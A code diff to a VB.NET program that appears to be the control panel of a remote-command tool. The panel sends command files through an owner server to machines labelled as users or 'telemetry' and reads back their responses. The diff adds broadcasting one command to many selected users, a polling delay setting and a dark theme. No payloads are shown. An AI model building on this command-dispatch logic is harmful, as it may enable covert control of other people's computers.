@@ -23,6 +23,7 @@
             LoaderTimer.Stop()
             LoaderTimer.Enabled = False
             Init()
+            CheckBox2.Checked = isThemeActive
         Catch ex As Exception
             AddToLog("LoadIt@Main", "Error: " & ex.Message, True)
         End Try
@@ -51,7 +52,9 @@
 
     Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
         SetTarget(ListBox1.SelectedItem)
-        RichTextBox2.AppendText(vbCrLf & Label4.Text)
+        If Not isMultiSelectMode Then
+            RichTextBox2.AppendText(vbCrLf & Label4.Text)
+        End If
     End Sub
     Private Sub ListBox1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListBox1.MouseDoubleClick
         SetTarget(ListBox1.SelectedItem)
@@ -80,11 +83,16 @@
     End Sub
     Sub SetTarget(ByVal userValue As String)
         Try
-            Label4.Text = "Target: " & userValue
-            userTarget = userValue
-            userIDTarget = userTarget.Replace("userID_", Nothing)
-            userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
-            TabPage5.Enabled = True
+            If isMultiSelectMode Then
+                Label4.Text = "Target: <multiselect>"
+                TabPage5.Enabled = True
+            Else
+                Label4.Text = "Target: " & userValue
+                userTarget = userValue
+                userIDTarget = userTarget.Replace("userID_", Nothing)
+                userIDTarget = userIDTarget.Replace("telemetry_", Nothing)
+                TabPage5.Enabled = True
+            End If
         Catch ex As Exception
             AddToLog("SetTarget@Main", "Error: " & ex.Message, True)
         End Try
@@ -93,7 +101,16 @@
     Private Sub ComboBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ComboBox1.KeyDown
         If e.KeyCode = Keys.Enter Then
             If ComboBox1.Text <> Nothing Then
-                SendCommandFile(userIDTarget, ComboBox1.Text)
+                If isMultiSelectMode Then
+                    For Each usuario As String In ListBox1.SelectedItems
+                        SendCommandFile(usuario, ComboBox1.Text)
+                    Next
+                    RichTextBox2.AppendText(vbCrLf & "Server: Commands Sended! (" & ComboBox1.Text & ") to " & ListBox1.SelectedItems.Count & " users")
+                Else
+                    SendCommandFile(userIDTarget, ComboBox1.Text)
+                End If
+                Label_Status.Text = Nothing
+                ComboBox1.Text = Nothing
                 If IsThreadReadCMDServerRunning = False Then
                     Label_Status.Text = "CMD Response thread started!"
                     ThreadReadCMDServer.Start()
@@ -114,7 +131,7 @@
             While True
                 Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
                 Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
-                Threading.Thread.Sleep(10000) '10 segundos
+                Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos
                 If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                 End If
@@ -156,9 +173,9 @@
                                                     vbCrLf & "Command3>" &
                                                     vbCrLf & "[Response]", False)
             My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
-            RichTextBox2.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
-            Label_Status.Text = Nothing
-            ComboBox1.Text = Nothing
+            If Not isMultiSelectMode Then
+                RichTextBox2.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
+            End If
             RichTextBox2.ScrollToCaret()
         Catch ex As Exception
             AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
@@ -250,5 +267,105 @@
 
     Private Sub Label_Status_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Label_Status.MouseDoubleClick
         Label_Status.Text = Nothing
+    End Sub
+
+    Sub ThemeManager(ByVal applyTheme As Boolean)
+        Try
+            If applyTheme Then
+                'Aplicar thema
+                Me.BackColor = Color.FromArgb(50, 50, 50)
+                Me.BackColor = Color.Black
+                Me.ForeColor = Color.LimeGreen
+            Else
+                'Desaplicar tema
+                Me.BackColor = DefaultBackColor
+                Me.ForeColor = DefaultForeColor
+            End If
+
+            For Each pagina As TabPage In TabControl1.Controls
+                pagina.BackColor = Me.BackColor
+                pagina.ForeColor = Me.ForeColor
+            Next
+
+            For Each pagina As TabPage In TabControl2.Controls
+                pagina.BackColor = Me.BackColor
+                pagina.ForeColor = Me.ForeColor
+            Next
+
+            For Each pagina As TabPage In TabControl3.Controls
+                pagina.BackColor = Me.BackColor
+                pagina.ForeColor = Me.ForeColor
+            Next
+
+            For Each pagina As TabPage In TabControl4.Controls
+                pagina.BackColor = Me.BackColor
+                pagina.ForeColor = Me.ForeColor
+            Next
+
+            GroupBox1.BackColor = Me.BackColor
+            GroupBox1.ForeColor = Me.ForeColor
+
+            GroupBox2.BackColor = Me.BackColor
+            GroupBox2.ForeColor = Me.ForeColor
+
+            GroupBox3.BackColor = Me.BackColor
+            GroupBox3.ForeColor = Me.ForeColor
+
+            GroupBox4.BackColor = Me.BackColor
+            GroupBox4.ForeColor = Me.ForeColor
+
+            GroupBox5.BackColor = Me.BackColor
+            GroupBox5.ForeColor = Me.ForeColor
+
+            RichTextBox1.BackColor = Me.BackColor
+            RichTextBox1.ForeColor = Me.ForeColor
+
+            RichTextBox2.BackColor = Me.BackColor
+            RichTextBox2.ForeColor = Me.ForeColor
+
+            RichTextBox3.BackColor = Me.BackColor
+            RichTextBox3.ForeColor = Me.ForeColor
+
+            RichTextBox4.BackColor = Me.BackColor
+            RichTextBox4.ForeColor = Me.ForeColor
+
+            RichTextBox5.BackColor = Me.BackColor
+            RichTextBox5.ForeColor = Me.ForeColor
+
+            ListBox1.BackColor = Me.BackColor
+            ListBox1.ForeColor = Me.ForeColor
+
+            ListBox2.BackColor = Me.BackColor
+            ListBox2.ForeColor = Me.ForeColor
+
+            ListBox3.BackColor = Me.BackColor
+            ListBox3.ForeColor = Me.ForeColor
+
+            ComboBox1.BackColor = Me.BackColor
+            ComboBox1.ForeColor = Me.ForeColor
+
+            TextBox2.BackColor = Me.BackColor
+            TextBox2.ForeColor = Me.ForeColor
+
+        Catch ex As Exception
+            AddToLog("ThemeManager@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
+        ThemeManager(CheckBox2.Checked)
+        isThemeActive = CheckBox2.Checked
+        SaveRegedit()
+    End Sub
+
+    Private Sub ListBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ListBox1.KeyDown
+        If e.KeyCode = Keys.ShiftKey Then
+            If isMultiSelectMode Then
+                ListBox1.SelectionMode = SelectionMode.One
+                isMultiSelectMode = False
+            Else
+                ListBox1.SelectionMode = SelectionMode.MultiSimple
+                isMultiSelectMode = True
+            End If
+        End If
     End Sub
 End Class
